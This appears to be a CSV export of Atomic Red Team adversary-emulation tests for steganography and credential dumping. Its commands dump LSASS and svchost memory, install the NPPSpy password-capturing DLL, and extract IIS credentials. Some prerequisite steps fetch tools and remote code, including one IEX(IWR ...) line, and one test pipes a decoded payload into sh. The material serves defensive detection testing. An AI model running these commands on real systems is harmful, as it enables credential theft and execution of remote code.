"TechniqueID","TestName","Command","PrereqCommand","CleanupCommand","SourceFile"
"T1001.002","Steganographic Tarball Embedding","Get-Content ""#{image_file}"", ""#{tar_file}"" -Encoding byte -ReadCount 0 | Set-Content ""#{new_image_file}"" -Encoding byte
","New-Item -Type Directory (split-path ""#{image_file}"") -ErrorAction ignore | Out-Null
Write-Output ""Downloading image file...""
$imageUrl = ""https://github.com/raghavsingh7/Pictures/raw/a9617d9fce289909441120a1e0366315c2c5e19d/lime.jpg""
Invoke-WebRequest -Uri $imageUrl -OutFile ""#{image_file}""

---
Write-Output ""Generating random passwords and saving to file...""
$passwords = 1..10 | ForEach-Object { -join ((1..12) | ForEach-Object { @('A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z') + @('a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z') + @('0','1','2','3','4','5','6','7','8','9') + @('!','@','#','$','%','^','&','*','(','(',')','-','=','+','_','[',']','{','}','|',';',';',':',',','<','>','?') | Get-Random }) }
$passwords | Out-File -FilePath ""#{passwords_file}""    

---
Write-Output ""Generating tarz file...""
tar -cvf ""#{tar_file}"" ""#{passwords_file}""
","Set-ExecutionPolicy Bypass -Scope Process -Force -ErrorAction Ignore
Remove-Item -Path ""#{new_image_file}"" -Force -ErrorAction Ignore
","C:\AtomicRedTeam\atomics\T1001.002\T1001.002.yaml"
"T1001.002","Embedded Script in Image Execution via Extract-Invoke-PSImage","cd ""PathToAtomicsFolder\ExternalPayloads\""
Import-Module .\Extract-Invoke-PSImage.ps1
$extractedScript=Extract-Invoke-PSImage -Image ""#{image_file}"" -Out ""$HOME\result.ps1""
$scriptContent = Get-Content ""$HOME\result.ps1"" -Raw
$base64Pattern = ""(?<=^|[^A-Za-z0-9+/])(?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}(==)?|[A-Za-z0-9+/]{3}=)?(?=$|[^A-Za-z0-9+/])""
$base64Strings = [regex]::Matches($scriptContent, $base64Pattern) | ForEach-Object { $_.Value }
$base64Strings | Set-Content ""$HOME\decoded.ps1""
$decodedContent = Get-Content ""$HOME\decoded.ps1"" -Raw
$decodedText = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($decodedContent))
$textPattern = '^.+'  
$textMatches = [regex]::Matches($decodedText, $textPattern) | ForEach-Object { $_.Value }
$scriptPath = ""$HOME\textExtraction.ps1""
$textMatches -join '' | Set-Content -Path $scriptPath
. ""$HOME\textExtraction.ps1""
","New-Item -Type Directory (split-path ""#{image_file}"") -ErrorAction Ignore | Out-Null
Write-Output ""Downloading image file...""
$imageUrl = ""https://github.com/raghavsingh7/Pictures/raw/f73e7686cdd848ed06e63af07f6f1a5e72de6320/evil_kitten.jpg""
Invoke-WebRequest -Uri $imageUrl -OutFile #{image_file}

---
New-Item -Path ""PathToAtomicsFolder\ExternalPayloads\"" -ItemType Directory -Force | Out-Null
Write-Output ""Downloading Extract-Invoke-PSImage.ps1 script...""
$scriptUrl = ""https://github.com/raghavsingh7/Extract-Invoke-PSImage/raw/7d8c165d2f9bfe9c3965181079b7c82e03168ce1/Extract-Invoke-PSImage.ps1""
Invoke-WebRequest -Uri $scriptUrl -OutFile #{psimage_script}
","Set-ExecutionPolicy Bypass -Scope Process -Force -ErrorAction Ignore
Remove-Item -Path ""$HOME\result.ps1"" -Force -ErrorAction Ignore 
Remove-Item -Path ""$HOME\textExtraction.ps1"" -Force -ErrorAction Ignore
Remove-Item -Path ""$HOME\decoded.ps1"" -Force -ErrorAction Ignore        
","C:\AtomicRedTeam\atomics\T1001.002\T1001.002.yaml"
"T1001.002","Execute Embedded Script in Image via Steganography","cat ""#{script}"" | base64 | xxd -p | sed 's/../& /g' | xargs -n1 | xxd -r -p | cat ""#{image}"" - > ""#{evil_image}""; strings ""#{evil_image}"" | tail -n 1 | base64 -d | sh","","rm ""#{evil_image}""","C:\AtomicRedTeam\atomics\T1001.002\T1001.002.yaml"
"T1003","Gsecdump","""#{gsecdump_exe}"" -a
","[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$parentpath = Split-Path ""#{gsecdump_exe}""; $binpath = ""$parentpath\gsecdump-v2b5.exe""
IEX(IWR ""https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-WebRequestVerifyHash.ps1"" -UseBasicParsing)
if(Invoke-WebRequestVerifyHash ""#{gsecdump_url}"" ""$binpath"" #{gsecdump_bin_hash}){
  Move-Item $binpath ""#{gsecdump_exe}""
}
","","C:\AtomicRedTeam\atomics\T1003\T1003.yaml"
"T1003","Credential Dumping with NPPSpy","Copy-Item ""PathToAtomicsFolder\..\ExternalPayloads\NPPSPY.dll"" -Destination ""C:\Windows\System32""
$path = Get-ItemProperty -Path ""HKLM:\SYSTEM\CurrentControlSet\Control\NetworkProvider\Order"" -Name PROVIDERORDER
$UpdatedValue = $Path.PROVIDERORDER + "",NPPSpy""
Set-ItemProperty -Path $Path.PSPath -Name ""PROVIDERORDER"" -Value $UpdatedValue
$rv = New-Item -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy -ErrorAction Ignore
$rv = New-Item -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -ErrorAction Ignore
$rv = New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -Name ""Class"" -Value 2 -ErrorAction Ignore
$rv = New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -Name ""Name"" -Value NPPSpy -ErrorAction Ignore
$rv = New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -Name ""ProviderPath"" -PropertyType ExpandString -Value ""%SystemRoot%\System32\NPPSPY.dll"" -ErrorAction Ignore
echo ""[!] Please, logout and log back in. Cleartext password for this account is going to be located in C:\NPPSpy.txt""","[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest -Uri https://github.com/gtworek/PSBits/raw/f221a6db08cb3b52d5f8a2a210692ea8912501bf/PasswordStealing/NPPSpy/NPPSPY.dll -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\NPPSPY.dll""","$cleanupPath = Get-ItemProperty -Path ""HKLM:\SYSTEM\CurrentControlSet\Control\NetworkProvider\Order"" -Name PROVIDERORDER
$cleanupUpdatedValue = $cleanupPath.PROVIDERORDER 
$cleanupUpdatedValue = $cleanupUpdatedValue -replace ',NPPSpy',''
Set-ItemProperty -Path $cleanupPath.PSPath -Name ""PROVIDERORDER"" -Value $cleanupUpdatedValue
Remove-Item -Path ""HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy"" -Recurse -ErrorAction Ignore
Remove-Item C:\NPPSpy.txt -ErrorAction Ignore
Remove-Item C:\Windows\System32\NPPSpy.dll -ErrorAction Ignore","C:\AtomicRedTeam\atomics\T1003\T1003.yaml"
"T1003","Dump svchost.exe to gather RDP credentials","$ps = (Get-NetTCPConnection -LocalPort 3389 -State Established -ErrorAction Ignore)
if($ps){$id = $ps[0].OwningProcess} else {$id = (Get-Process svchost)[0].Id }
C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump $id $env:TEMP\svchost-exe.dmp full
","","Remove-Item $env:TEMP\svchost-exe.dmp -ErrorAction Ignore
","C:\AtomicRedTeam\atomics\T1003\T1003.yaml"
"T1003","Retrieve Microsoft IIS Service Account Credentials Using AppCmd (using list)","C:\Windows\System32\inetsrv\appcmd.exe list apppool /@t:*
C:\Windows\System32\inetsrv\appcmd.exe list apppool /@text:*
C:\Windows\System32\inetsrv\appcmd.exe list apppool /text:*","Install-WindowsFeature -name Web-Server -IncludeManagementTools","","C:\AtomicRedTeam\atomics\T1003\T1003.yaml"
"T1003","Retrieve Microsoft IIS Service Account Credentials Using AppCmd (using config)","C:\Windows\System32\inetsrv\appcmd.exe list apppool /config","Install-WindowsFeature -name Web-Server -IncludeManagementTools","","C:\AtomicRedTeam\atomics\T1003\T1003.yaml"
"T1003","Dump Credential Manager using keymgr.dll and rundll32.exe","rundll32.exe keymgr,KRShowKeyMgr","","","C:\AtomicRedTeam\atomics\T1003\T1003.yaml"
"T1003","Send NTLM Hash with RPC Test Connection","rpcping -s #{server_ip} -e #{custom_port} -a privacy -u NTLM 1>$Null","","","C:\AtomicRedTeam\atomics\T1003\T1003.yaml"
"T1003.001","Dump LSASS.exe Memory using ProcDump","""#{procdump_exe}"" -accepteula -ma lsass.exe #{output_file}
","[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest ""https://download.sysinternals.com/files/Procdump.zip"" -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\Procdump.zip""
Expand-Archive ""PathToAtomicsFolder\..\ExternalPayloads\Procdump.zip"" ""PathToAtomicsFolder\..\ExternalPayloads\Procdump"" -Force
New-Item -ItemType Directory (Split-Path ""#{procdump_exe}"") -Force | Out-Null
Copy-Item ""PathToAtomicsFolder\..\ExternalPayloads\Procdump\Procdump.exe"" ""#{procdump_exe}"" -Force
","del ""#{output_file}"" >nul 2> nul
","C:\AtomicRedTeam\atomics\T1003.001\T1003.001.yaml"
"T1003.001","Dump LSASS.exe Memory using comsvcs.dll","C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id $env:TEMP\lsass-comsvcs.dmp full
","","Remove-Item $env:TEMP\lsass-comsvcs.dmp -ErrorAction Ignore
","C:\AtomicRedTeam\atomics\T1003.001\T1003.001.yaml"
"T1003.001","Dump LSASS.exe Memory using direct system calls and API unhooking","""#{dumpert_exe}""
","[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
New-Item -ItemType Directory (Split-Path ""#{dumpert_exe}"") -Force | Out-Null
Invoke-WebRequest ""https://github.com/clr2of8/Dumpert/raw/5838c357224cc9bc69618c80c2b5b2d17a394b10/Dumpert/x64/Release/Outflank-Dumpert.exe"" -OutFile ""#{dumpert_exe}""
","del C:\windows\temp\dumpert.dmp >nul 2> nul
","C:\AtomicRedTeam\atomics\T1003.001\T1003.001.yaml"
"T1003.001","Dump LSASS.exe Memory using NanoDump","PathToAtomicsFolder\..\ExternalPayloads\nanodump.x64.exe -w ""%temp%\nanodump.dmp""
","[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest ""https://github.com/fortra/nanodump/raw/2c0b3d5d59c56714312131de9665defb98551c27/dist/nanodump.x64.exe"" -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\nanodump.x64.exe"" 
","del ""%temp%\nanodump.dmp"" >nul 2> nul
","C:\AtomicRedTeam\atomics\T1003.001\T1003.001.yaml"
"T1003.001","Dump LSASS.exe Memory using Windows Task Manager","","","","C:\AtomicRedTeam\atomics\T1003.001\T1003.001.yaml"
